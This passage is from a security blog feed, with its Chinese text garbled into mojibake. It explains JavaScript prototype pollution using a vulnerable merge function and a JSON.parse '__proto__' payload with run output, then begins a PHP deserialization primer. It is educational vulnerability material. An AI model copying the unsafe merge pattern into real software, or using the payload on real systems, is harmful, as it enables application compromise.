&#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;;</span><br><span class="line"><span class="title function_">merge</span>(o1, o2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure><h4 id="å…³é”®ç‚¹ï¼š"><a href="#å…³é”®ç‚¹ï¼š" class="headerlink" title="å…³é”®ç‚¹ï¼š"></a>å…³é”®ç‚¹ï¼š</h4><ul><li><strong><code>for...in</code> ä¸ä¼šç›´æ¥æšä¸¾ <code>__proto__</code> ä½œä¸ºæ™®é€šé”®ã€‚</strong></li><li><code>o2</code> åªæœ‰ä¸€ä¸ªç›´æ¥å±æ€§ <code>a</code>ï¼Œå› æ­¤ <code>merge</code> å‡½æ•°ä¸­åªä¼šå¤„ç† <code>a</code>ã€‚</li><li><code>__proto__</code> è¢«ç”¨ä½œåŸå‹è®¾ç½®ï¼Œ<code>&#123;b: 2&#125;</code> æˆä¸ºäº† <code>o2</code> çš„åŸå‹ã€‚</li></ul><p>å› æ­¤ï¼š</p><ul><li><strong><code>o1</code> åˆå¹¶ç»“æœ</strong>ï¼š<code>o1.a = 1</code>ã€‚</li><li><strong><code>o1.b</code> æ˜¯ undefined</strong>ï¼šå› ä¸º <code>b</code> æ˜¯ <code>o2</code> çš„åŸå‹å±æ€§ï¼Œè€Œ <code>merge</code> å‡½æ•°ä¸ä¼šé€’å½’æˆ–å¤åˆ¶åŸå‹é“¾çš„å±æ€§ã€‚</li></ul><h4 id="4-ä¸ºä»€ä¹ˆ-o1-b-2-è¿™å¥è¯ä¸æˆç«‹ï¼Ÿ"><a href="#4-ä¸ºä»€ä¹ˆ-o1-b-2-è¿™å¥è¯ä¸æˆç«‹ï¼Ÿ" class="headerlink" title="4. ä¸ºä»€ä¹ˆ o1.b = 2 è¿™å¥è¯ä¸æˆç«‹ï¼Ÿ"></a>4. <strong>ä¸ºä»€ä¹ˆ <code>o1.b = 2</code> è¿™å¥è¯ä¸æˆç«‹ï¼Ÿ</strong></h4><p>åˆå¹¶åï¼Œ<code>o1</code> å¹¶æ²¡æœ‰ <code>b</code>ï¼Œå› ä¸ºï¼š</p><ul><li><code>b</code> å¹¶ä¸æ˜¯ <code>o2</code> è‡ªèº«çš„å±æ€§ï¼Œè€Œæ˜¯å…¶åŸå‹çš„å±æ€§ã€‚</li><li><code>merge</code> å‡½æ•°åªå¤„ç†ç›´æ¥å±æ€§ï¼Œæœªå¤åˆ¶ <code>b</code> åˆ° <code>o1</code>ã€‚</li></ul><p><strong>æ€»ç»“ï¼š</strong> <code>__proto__</code> åœ¨å¯¹è±¡å­—é¢é‡ä¸­ä¼šè¢«è§£é‡Šä¸ºè®¾ç½®åŸå‹ï¼Œè€Œä¸æ˜¯æ™®é€šé”®å€¼å¯¹ã€‚æ‰€ä»¥ï¼Œ<code>merge</code> åªä¼šå¤„ç† <code>o2</code> çš„ç›´æ¥å±æ€§ï¼ˆ<code>a</code>ï¼‰ï¼Œä¸ä¼šå¤„ç†é€šè¿‡åŸå‹é“¾ç»§æ‰¿çš„ <code>b</code>ï¼Œå› æ­¤ <code>o1.b</code> ä»ç„¶æ˜¯ <code>undefined</code>ã€‚</p><h4 id="5-ä¸ºä»€ä¹ˆè¿è¡Œç»“æœç¡®æ˜¯2"><a href="#5-ä¸ºä»€ä¹ˆè¿è¡Œç»“æœç¡®æ˜¯2" class="headerlink" title="5.ä¸ºä»€ä¹ˆè¿è¡Œç»“æœç¡®æ˜¯2"></a>5.ä¸ºä»€ä¹ˆè¿è¡Œç»“æœç¡®æ˜¯2</h4><p>è¿è¡Œç»“æœæ¥çœ‹ï¼Œ<code>console.log(o1.b)</code> è¿”å›äº† <code>2</code>ï¼Œè¿™è¡¨æ˜åœ¨æŸç§ç¨‹åº¦ä¸Šç¡®å®è¯»å–åˆ°äº†å±æ€§ <code>b</code>ï¼Œè€Œè¿™æ˜¯ä» <code>__proto__</code> åŸå‹é“¾ç»§æ‰¿çš„å±æ€§ã€‚æˆ‘ä»¬é‡æ–°åˆ†æä»¥ä¸‹å‡ ä¸ªå…³é”®ç‚¹ï¼Œå¸®åŠ©ç†è§£ä¸ºä»€ä¹ˆä¼šå‘ç”Ÿè¿™ç§ç°è±¡ï¼š</p><h4 id="5-1-proto-åœ¨å¯¹è±¡å­—é¢é‡ä¸­çš„ä½œç”¨"><a href="#5-1-proto-åœ¨å¯¹è±¡å­—é¢é‡ä¸­çš„ä½œç”¨" class="headerlink" title="5.1. __proto__ åœ¨å¯¹è±¡å­—é¢é‡ä¸­çš„ä½œç”¨"></a>5.1. <strong><code>__proto__</code> åœ¨å¯¹è±¡å­—é¢é‡ä¸­çš„ä½œç”¨</strong></h4><p>å½“ä½ å®šä¹‰ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o2 = &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="string">&quot;__proto__&quot;</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125; &#125;;</span><br></pre></td></tr></table></figure><p><code>o2</code> çš„ç»“æ„å˜æˆï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">o2 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">__proto__</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™æ„å‘³ç€ <code>o2</code> çš„åŸå‹è¢«è®¾ç½®ä¸º <code>&#123; b: 2 &#125;</code>ï¼Œå³ <code>o2</code> é€šè¿‡åŸå‹é“¾å¯ä»¥è®¿é—® <code>b</code>ã€‚</p><h4 id="5-2-merge-å‡½æ•°å¦‚ä½•å·¥ä½œ"><a href="#5-2-merge-å‡½æ•°å¦‚ä½•å·¥ä½œ" class="headerlink" title="5.2. merge å‡½æ•°å¦‚ä½•å·¥ä½œ"></a>5.2. <strong><code>merge</code> å‡½æ•°å¦‚ä½•å·¥ä½œ</strong></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong><code>for...in</code> çš„è¡Œä¸º</strong>ï¼š <code>for...in</code> ä¼šè¿­ä»£ <code>source</code> çš„<strong>å¯æšä¸¾å±æ€§</strong>ï¼ŒåŒ…æ‹¬ç»§æ‰¿è‡ªåŸå‹çš„å±æ€§ã€‚</li></ul><p>åœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼š</p><ul><li><code>o2</code> çš„ç›´æ¥å±æ€§æ˜¯ <code>a</code>ã€‚</li><li><code>o2</code> é€šè¿‡åŸå‹é“¾ç»§æ‰¿äº†å±æ€§ <code>b</code>ï¼Œä¸” <code>b</code> æ˜¯å¯æšä¸¾çš„ã€‚</li></ul><h4 id="5-3-æ‰§è¡Œè¿‡ç¨‹"><a href="#5-3-æ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="5.3. æ‰§è¡Œè¿‡ç¨‹"></a>5.3. <strong>æ‰§è¡Œè¿‡ç¨‹</strong></h4><p>å½“ <code>merge(o1, o2)</code> æ‰§è¡Œæ—¶ï¼š</p><ul><li><code>key = &quot;a&quot;</code>ï¼šå°† <code>o2.a</code> çš„å€¼ <code>1</code> åˆå¹¶åˆ° <code>o1</code>ã€‚</li><li><code>key = &quot;b&quot;</code>ï¼šç”±äº <code>b</code> æ˜¯ä» <code>__proto__</code> ç»§æ‰¿çš„ï¼Œå®ƒä¹Ÿè¢« <code>for...in</code> è¿­ä»£åˆ°ï¼Œå› æ­¤ <code>o2.b</code> çš„å€¼ <code>2</code> è¢«èµ‹å€¼åˆ° <code>o1.b</code>ã€‚</li></ul><p>æœ€ç»ˆï¼Œ<code>o1</code> çš„å†…å®¹æ˜¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">o1 = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="5-4-ä¸ºä»€ä¹ˆ-console-log-o1-b-è¾“å‡º-2ï¼Ÿ"><a href="#5-4-ä¸ºä»€ä¹ˆ-console-log-o1-b-è¾“å‡º-2ï¼Ÿ" class="headerlink" title="5.4. ä¸ºä»€ä¹ˆ console.log(o1.b) è¾“å‡º 2ï¼Ÿ"></a>5.4. <strong>ä¸ºä»€ä¹ˆ <code>console.log(o1.b)</code> è¾“å‡º <code>2</code>ï¼Ÿ</strong></h4><p>å½“ <code>merge</code> å‡½æ•°è¿è¡Œå®Œåï¼Œ<code>o1</code> å¯¹è±¡è¢«èµ‹äºˆäº†ä¸€ä¸ªæ–°å±æ€§ <code>b</code>ï¼Œå…¶å€¼ä¸º <code>2</code>ã€‚å› æ­¤ï¼Œå½“ä½ æ‰§è¡Œï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">b</span>); <span class="comment">// è¾“å‡º 2</span></span><br></pre></td></tr></table></figure><p>è¿™æ­£æ˜¯ç”±äº <code>b</code> è¢«ç›´æ¥åˆå¹¶åˆ° <code>o1</code> çš„åŸå› ã€‚</p><h4 id="6-è¿™æ˜¯å¦ç®—åŸå‹æ±¡æŸ“ï¼Ÿ"><a href="#6-è¿™æ˜¯å¦ç®—åŸå‹æ±¡æŸ“ï¼Ÿ" class="headerlink" title="6. è¿™æ˜¯å¦ç®—åŸå‹æ±¡æŸ“ï¼Ÿ"></a>6. <strong>è¿™æ˜¯å¦ç®—åŸå‹æ±¡æŸ“ï¼Ÿ</strong></h4><p><strong>ä¸ç®—çœŸæ­£çš„åŸå‹æ±¡æŸ“</strong>ï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ul><li><strong>æ±¡æŸ“çš„å®šä¹‰</strong>ï¼šåŸå‹æ±¡æŸ“æ„å‘³ç€ä¿®æ”¹äº†åŸå‹å¯¹è±¡ï¼ˆå¦‚ <code>Object.prototype</code>ï¼‰ï¼Œå¯¼è‡´æ‰€æœ‰å¯¹è±¡éƒ½å—åˆ°å½±å“ã€‚</li><li>ä½ çš„æ“ä½œä»…ä»…æ˜¯åœ¨ <code>o1</code> ä¸Šè®¾ç½®äº†ä¸€ä¸ªæ™®é€šå±æ€§ <code>b</code>ï¼Œå¹¶æ²¡æœ‰ä¿®æ”¹å…¨å±€åŸå‹é“¾ã€‚å› æ­¤ï¼Œå…¶ä»–å¯¹è±¡ï¼ˆå¦‚ <code>&#123;&#125;</code>ï¼‰å¹¶ä¸ä¼šå—åˆ°å½±å“ã€‚</li></ul><h4 id="7-éªŒè¯æ˜¯å¦æ±¡æŸ“äº†å…¨å±€åŸå‹"><a href="#7-éªŒè¯æ˜¯å¦æ±¡æŸ“äº†å…¨å±€åŸå‹" class="headerlink" title="7. éªŒè¯æ˜¯å¦æ±¡æŸ“äº†å…¨å±€åŸå‹"></a>7. <strong>éªŒè¯æ˜¯å¦æ±¡æŸ“äº†å…¨å±€åŸå‹</strong></h4><p>ä½ å¯ä»¥éªŒè¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">b</span>); <span class="comment">// å¦‚æœæ˜¯åŸå‹æ±¡æŸ“ï¼Œä¼šè¾“å‡º 2ï¼Œä½†æ˜¯è¾“å‡ºçš„æ˜¯undefined</span></span><br></pre></td></tr></table></figure><p>è‹¥ç»“æœä¸º <code>undefined</code>ï¼Œè¯´æ˜æ²¡æœ‰æ±¡æŸ“å…¨å±€åŸå‹ã€‚</p><h4 id="ç»“è®º"><a href="#ç»“è®º" class="headerlink" title="ç»“è®º"></a>ç»“è®º</h4><p>ä½ å½“å‰çš„ <code>merge</code> æ“ä½œä»…ä»…æ˜¯å°† <code>b</code> åˆå¹¶åˆ°äº† <code>o1</code> å¯¹è±¡ä¸Šï¼Œæ²¡æœ‰å¯¼è‡´åŸå‹æ±¡æŸ“ã€‚ <strong>è¦å®ç°åŸå‹æ±¡æŸ“ï¼Œéœ€è¦æ˜ç¡®æ“ä½œå…¨å±€åŸå‹é“¾ï¼ˆä¾‹å¦‚é€šè¿‡ä¿®æ”¹ <code>Object.prototype</code>ï¼‰</strong>ã€‚</p><h4 id="å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¨€å½’æ­£ä¼ ï¼Œå¦‚ä½•æ‰èƒ½çœŸæ­£æ±¡æŸ“å‘¢ï¼Ÿ"><a href="#å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¨€å½’æ­£ä¼ ï¼Œå¦‚ä½•æ‰èƒ½çœŸæ­£æ±¡æŸ“å‘¢ï¼Ÿ" class="headerlink" title="å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¨€å½’æ­£ä¼ ï¼Œå¦‚ä½•æ‰èƒ½çœŸæ­£æ±¡æŸ“å‘¢ï¼Ÿ"></a>å¥½ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¨€å½’æ­£ä¼ ï¼Œå¦‚ä½•æ‰èƒ½çœŸæ­£æ±¡æŸ“å‘¢ï¼Ÿ</h4><p>ä¸»è§’ç™»åœºâ€“è¯·çœ‹ä¸‹é¢ä»£ç </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment">//æ³¨æ„let o2 = &#123;&quot;a&quot;: 1, &quot;proto&quot;: &#123;&quot;b&quot;: 2&#125;&#125;è¿™ç§å†™æ³•å’Œlet o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;å†™æ³•ç»“æœæ˜¯ä¸€æ ·çš„</span></span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"> </span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">[<span class="title class_">Running</span>] node <span class="string">&quot;d:\web\æ±¡æŸ“\PCB-notadmin\payload.js&quot;</span></span><br><span class="line"><span class="number">1</span> <span class="number">2</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"></span><br><span class="line">[<span class="title class_">Done</span>] exited <span class="keyword">with</span> code=<span class="number">0</span> <span class="keyword">in</span> <span class="number">2.918</span> seconds</span><br></pre></td></tr></table></figure><h4 id="1-JSON-parse-å’Œ-proto-çš„ä½œç”¨"><a href="#1-JSON-parse-å’Œ-proto-çš„ä½œç”¨" class="headerlink" title="1. JSON.parse å’Œ __proto__ çš„ä½œç”¨"></a>1. <strong><code>JSON.parse</code> å’Œ <code>__proto__</code> çš„ä½œç”¨</strong></h4><p>åœ¨ <code>JSON.parse</code> ä¸­ï¼Œ<code>&#123;&quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;</code> ä¼šè¢«è§£æä¸ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">__proto__</span>: &#123; <span class="attr">b</span>: <span class="number">2</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œ<code>o2</code> çš„ <code>__proto__</code> å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ™®é€šå±æ€§ï¼Œè€Œä¸æ˜¯åŸå‹é“¾ã€‚</p><p>ä½†æ˜¯ï¼Œå½“ <code>merge</code> å‡½æ•°æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target[key] = source[key];</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœ <code>key</code> æ˜¯ <code>__proto__</code>ï¼Œå®ƒä¼šè§¦å‘ <strong>åŸå‹é“¾ä¿®æ”¹</strong>ï¼Œè¿™æ ·å°±ç›¸å½“äºç»™æœ€é¡¶å±‚çš„Object.prototypeæ‰€æŒ‡å‘çš„å¯¹è±¡æ·»åŠ äº†å±æ€§ï¼Œæ‰€ä»¥æˆ‘ä»¬éšä¾¿åˆ›å»ºä¸€ä¸ªå¯¹è±¡ä¹Ÿå°±æœ‰äº†bè¿™ä¸ªå±æ€§ ã€‚</p><h4 id="2-åŸå‹æ±¡æŸ“çš„å‘ç”Ÿ"><a href="#2-åŸå‹æ±¡æŸ“çš„å‘ç”Ÿ" class="headerlink" title="2. åŸå‹æ±¡æŸ“çš„å‘ç”Ÿ"></a>2. <strong>åŸå‹æ±¡æŸ“çš„å‘ç”Ÿ</strong></h4><p>åœ¨ <code>merge(o1, o2)</code> ä¸­ï¼š</p><ul><li><code>key = &quot;a&quot;</code>ï¼š<code>o1.a = 1</code>ï¼Œæ— é—®é¢˜ã€‚</li><li><code>key = &quot;__proto__&quot;</code>ï¼š<code>o1[&quot;__proto__&quot;] = &#123; b: 2 &#125;</code>ã€‚</li></ul><p>å½“è®¾ç½® <code>o1[&quot;__proto__&quot;] = &#123; b: 2 &#125;</code> æ—¶ï¼Œå®é™…ä¸Šä¿®æ”¹äº† <code>o1</code> çš„åŸå‹é“¾ï¼Œä½¿ <code>o1</code> å’Œæ‰€æœ‰ç»§æ‰¿è‡ª <code>Object.prototype</code> çš„å¯¹è±¡ï¼ˆåŒ…æ‹¬ <code>o3</code>ï¼‰çš„åŸå‹è¢«æ±¡æŸ“ã€‚</p><p>å› æ­¤ï¼š</p><ul><li><code>o1.b</code> ç­‰äº <code>2</code>ï¼Œå› ä¸º <code>b</code> æ¥è‡ªäºè¢«æ±¡æŸ“çš„åŸå‹ã€‚</li><li><code>o3.b</code> ä¹Ÿç­‰äº <code>2</code>ï¼Œå³ä½¿ <code>o3</code> æœ¬èº«æ²¡æœ‰ <code>b</code>ï¼Œå®ƒä»ç„¶ä»å…¨å±€çš„ <code>Object.prototype</code> ç»§æ‰¿äº†æ±¡æŸ“ã€‚</li></ul><h4 id="3-éªŒè¯æ±¡æŸ“"><a href="#3-éªŒè¯æ±¡æŸ“" class="headerlink" title="3. éªŒè¯æ±¡æŸ“"></a>3. <strong>éªŒè¯æ±¡æŸ“</strong></h4><p>å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼éªŒè¯æ±¡æŸ“ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">b</span>); <span class="comment">// è¾“å‡º 2ï¼Œè¯´æ˜ Object.prototype è¢«æ±¡æŸ“</span></span><br></pre></td></tr></table></figure><p>è¿™å°±æ˜¯JSåŸå‹é“¾æ±¡æŸ“åŸºç¡€äº†ã€‚</p><p><a href="https://blog.csdn.net/qq_51586883/article/details/119867720">jsåŸå‹é“¾æ±¡æŸ“(è¶…è¯¦ç»†)</a></p><p><a href="https://carsaid.github.io/burpsuite-learn/wsa/advanced/prototype-pollution/server-side/">æœåŠ¡ç«¯åŸå‹é“¾æ±¡æŸ“æ¼æ´</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -NodeJs -pollution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPååºåˆ—åŒ–&amp;SESSIONååºåˆ—åŒ–</title>
      <link href="/2024/07/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2024/07/16/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-SESSION%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPååºåˆ—åŒ–-SESSIONååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–-SESSIONååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–&amp;SESSIONååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–&amp;SESSIONååºåˆ—åŒ–</h1><h2 id="PHPååºåˆ—åŒ–åŸºæœ¬æ¦‚å¿µ"><a href="#PHPååºåˆ—åŒ–åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="PHPååºåˆ—åŒ–åŸºæœ¬æ¦‚å¿µ"></a>PHPååºåˆ—åŒ–åŸºæœ¬æ¦‚å¿µ</h2><p>phpåºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ªå¯¹è±¡ï¼Œè¿›è¡Œå˜æ¢æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯ä¸€ä¸ªä¸ªé”®å€¼å¯¹ï¼Œæ–¹ä¾¿ä¼ è¾“æ•°æ®ï¼Œé‚£ååºåˆ—åŒ–ï¼Œå°±æ˜¯æŠŠå®ƒç¿»è¿‡æ¥ï¼Œä»ä¸€ä¸ªä¸ªé”®å€¼å¯¹å†è½¬æ¢æˆä¸€ä¸ªå¯¹è±¡ã€‚</p><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;ooo&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">è¾“å‡ºï¼š  </span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ooo&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;&#125;</span><br><span class="line"></span><br><span class="line">è§£é‡Šï¼š</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>;ï¼šè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼ˆObjectï¼‰ï¼Œç±»åæ˜¯testï¼Œç±»åé•¿åº¦ä¸º<span class="number">4</span>ï¼ŒåŒ…å«<span class="number">2</span>ä¸ªå±æ€§ã€‚</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;ooo&quot;</span>;ï¼šç¬¬ä¸€ä¸ªå±æ€§æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ˆStringï¼‰ï¼Œå±æ€§åä¸ºnameï¼Œé•¿åº¦ä¸º<span class="number">4</span>ï¼Œå¯¹åº”çš„å€¼ä¸ºå­—ç¬¦ä¸²oooï¼Œé•¿åº¦ä¸º<span class="number">3</span>ã€‚</span><br><span class="line">s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">18</span>;ï¼šç¬¬äºŒä¸ªå±æ€§ä¹Ÿæ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ˆStringï¼‰ï¼Œå±æ€§åä¸ºageï¼Œé•¿åº¦ä¸º<span class="number">3</span>ï¼Œå¯¹åº”çš„å€¼ä¸ºæ•´æ•°ï¼ˆIntegerï¼‰<span class="number">18</span>ã€‚</span><br><span class="line">ç»¼ä¸Šæ‰€è¿°ï¼Œè¿™æ®µä»£ç è¡¨ç¤ºä¸€ä¸ªç±»åä¸ºtestçš„å¯¹è±¡ï¼Œå®ƒæœ‰ä¸¤ä¸ªå±æ€§ï¼šnameï¼ˆå€¼ä¸º<span class="string">&quot;ooo&quot;</span>ï¼‰å’Œageï¼ˆå€¼ä¸º<span class="number">18</span>ï¼‰ã€‚</span><br></pre></td></tr></table></figure><h2 id="PHPååºåˆ—åŒ–çš„å‡ ä¸ªå¿…çŸ¥é­”æœ¯æ–¹æ³•"><a href="#PHPååºåˆ—åŒ–çš„å‡ ä¸ªå¿…çŸ¥é­”æœ¯æ–¹æ³•" class="headerlink" title="PHPååºåˆ—åŒ–çš„å‡ ä¸ªå¿…çŸ¥é­”æœ¯æ–¹æ³•"></a><a href="https://zhuanlan.zhihu.com/p/377676274">PHPååºåˆ—åŒ–çš„å‡ ä¸ªå¿…çŸ¥é­”æœ¯æ–¹æ³•</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>()ï¼Œç±»çš„æ„é€ å‡½æ•°,åœ¨åˆ›é€ ä¸€ä¸ªå¯¹è±¡æ—¶å€™ï¼Œé¦–å…ˆä¼šå»æ‰§è¡Œçš„ä¸€ä¸ªæ–¹æ³•ã€‚ä½†æ˜¯åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹æ˜¯ä¸ä¼šè§¦å‘çš„ã€‚</span><br><span class="line"></span><br><span class="line"><span class="title 